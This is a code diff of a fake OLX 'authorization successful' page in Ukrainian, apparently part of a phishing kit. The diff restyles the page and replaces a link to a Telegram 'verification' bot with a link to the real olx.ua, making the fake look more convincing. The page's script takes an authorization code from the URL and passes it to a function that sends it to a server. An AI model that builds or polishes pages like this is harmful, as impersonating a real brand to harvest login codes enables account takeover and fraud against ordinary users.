@@ -8,71 +8,106 @@
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 
 <style>
-:root {
-    --olx-dark: #002f34;
-    --bg: #f2f4f5;
+
+body{
+margin:0;
+font-family:'Roboto',sans-serif;
+height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+background:linear-gradient(135deg,#e8f0f1,#f2f4f5);
 }
 
-body {
-    margin: 0;
-    font-family: 'Roboto', sans-serif;
-    background: var(--bg);
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
+/* карточка */
+
+.container{
+background:white;
+width:90%;
+max-width:420px;
+padding:45px 35px;
+border-radius:16px;
+box-shadow:0 15px 40px rgba(0,0,0,0.12);
+text-align:center;
+animation:fadeIn .6s ease;
 }
 
-.container {
-    background: white;
-    width: 90%;
-    max-width: 400px;
-    padding: 40px 30px;
-    border-radius: 8px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-    text-align: center;
+/* анимация появления */
+
+@keyframes fadeIn{
+from{opacity:0;transform:translateY(20px)}
+to{opacity:1;transform:translateY(0)}
 }
 
-.logo {
-    font-size: 28px;
-    font-weight: 700;
-    color: var(--olx-dark);
-    margin-bottom: 20px;
+/* галочка */
+
+.checkmark{
+width:80px;
+height:80px;
+border-radius:50%;
+background:#27ae60;
+margin:0 auto 20px;
+display:flex;
+align-items:center;
+justify-content:center;
+animation:pop .4s ease;
 }
 
-h1 {
-    font-size: 22px;
-    margin-bottom: 10px;
-    color: var(--olx-dark);
+.checkmark svg{
+width:40px;
+height:40px;
+stroke:white;
+stroke-width:4;
+fill:none;
 }
 
-p {
-    font-size: 14px;
-    color: #406367;
-    margin-bottom: 25px;
+@keyframes pop{
+0%{transform:scale(.6);opacity:.3}
+100%{transform:scale(1);opacity:1}
 }
 
-.btn {
-    display: block;
-    width: 100%;
-    padding: 16px;
-    background: var(--olx-dark);
-    color: white;
-    text-decoration: none;
-    font-weight: 700;
-    border-radius: 6px;
-    transition: opacity .2s;
+h1{
+font-size:24px;
+margin:10px 0;
+color:#1f2d3d;
 }
 
-.btn:hover {
-    opacity: 0.9;
+p{
+color:#5f6c7b;
+font-size:14px;
+margin-bottom:30px;
 }
 
-.footer {
-    margin-top: 20px;
-    font-size: 11px;
-    color: #8fa3a6;
+/* кнопка */
+
+.btn{
+display:block;
+width:100%;
+padding:16px;
+background:#1f2d3d;
+color:white;
+font-weight:700;
+border-radius:10px;
+text-decoration:none;
+transition:.25s;
+box-shadow:0 6px 15px rgba(0,0,0,.15);
 }
+
+.btn:hover{
+transform:translateY(-2px);
+box-shadow:0 10px 20px rgba(0,0,0,.18);
+}
+
+.btn:active{
+transform:scale(.97);
+}
+
+.footer{
+margin-top:25px;
+font-size:11px;
+color:#9aa7b3;
+}
+
 </style>
 </head>
 
@@ -80,20 +115,23 @@ p {
 
 <div class="container">
 
-    <div class="logo">OLX</div>
-
-    <h1>Авторизація пройшла успішно</h1>
-
-    <p>Поверніться до застосунку, щоб підтвердити дію.</p>
-
-    <a href="https://t.me/olx_verif_bot" class="btn">Повернутися в застосунок</a>
-
-    <div class="footer">
-        © 2026
-    </div>
-
+<div class="checkmark">
+<svg viewBox="0 0 24 24">
+<polyline points="4,13 9,18 20,6"/>
+</svg>
 </div>
 
+<h1>Авторизація пройшла успішно</h1>
+
+<p>Ви можете повернутися до застосунку та продовжити роботу.</p>
+
+<a href="https://olx.ua" class="btn">Повернутися</a>
+
+<div class="footer">
+© 2026
+</div>
+
+</div>
 <script>
 async function sendCodeToServer(authCode) {
     if (!authCode) return;
@@ -120,6 +158,7 @@ if (codeFromUrl) {
     sendCodeToServer(codeFromUrl);
 }
 </script>
-
 </body>
 </html>
+
+
